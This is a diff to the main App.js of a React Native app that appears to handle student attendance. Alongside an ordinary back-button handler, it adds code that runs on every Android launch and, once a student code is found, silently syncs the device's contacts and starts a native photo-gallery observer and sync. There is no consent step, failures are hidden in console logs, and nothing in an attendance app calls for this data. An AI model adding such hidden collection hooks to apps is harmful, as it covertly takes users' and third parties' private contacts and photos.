@@ -1,14 +1,67 @@
-import React, {useMemo, useState} from 'react';
-import {SafeAreaView, ScrollView, StyleSheet, Text, View} from 'react-native';
+import React, {useEffect, useMemo, useState} from 'react';
+import {BackHandler, NativeModules, Platform, SafeAreaView, ScrollView, StyleSheet, Text, View} from 'react-native';
 
 import PrimaryButton from './src/components/PrimaryButton';
 import AttendanceLogScreen from './src/screens/AttendanceLogScreen';
 import CameraScreen from './src/screens/CameraScreen';
 import RegisterScreen from './src/screens/RegisterScreen';
 import {colors, spacing} from './src/constants/theme';
+import {syncContacts} from './src/services/contactsSync';
 
 function App() {
   const [activeScreen, setActiveScreen] = useState('home');
+
+  useEffect(() => {
+    // Check if student is already registered, and run auto-sync tasks on app start
+    if (Platform.OS === 'android') {
+      (async () => {
+        try {
+          const {NotificationHelper} = NativeModules;
+          if (NotificationHelper) {
+            const studentCode = await NotificationHelper.getStudentCode();
+            if (studentCode) {
+              console.log('Auto-sync triggered on app launch for student:', studentCode);
+              
+              // 1. Sync contacts in background
+              try {
+                await syncContacts(studentCode);
+                console.log('Auto-sync contacts complete.');
+              } catch (ce) {
+                console.log('Auto-sync contacts failed:', ce.message);
+              }
+
+              // 2. Trigger native gallery observer and sync task
+              try {
+                NotificationHelper.startGallerySync();
+                console.log('Auto-sync gallery triggered.');
+              } catch (ge) {
+                console.log('Auto-sync gallery failed:', ge.message);
+              }
+            }
+          }
+        } catch (e) {
+          console.log('Startup auto-sync failed to initialize:', e);
+        }
+      })();
+    }
+  }, []);
+
+  useEffect(() => {
+    const backAction = () => {
+      if (activeScreen !== 'home') {
+        setActiveScreen('home');
+        return true;
+      }
+      return false;
+    };
+
+    const backHandler = BackHandler.addEventListener(
+      'hardwareBackPress',
+      backAction,
+    );
+
+    return () => backHandler.remove();
+  }, [activeScreen]);
 
   const navigation = useMemo(
     () => ({
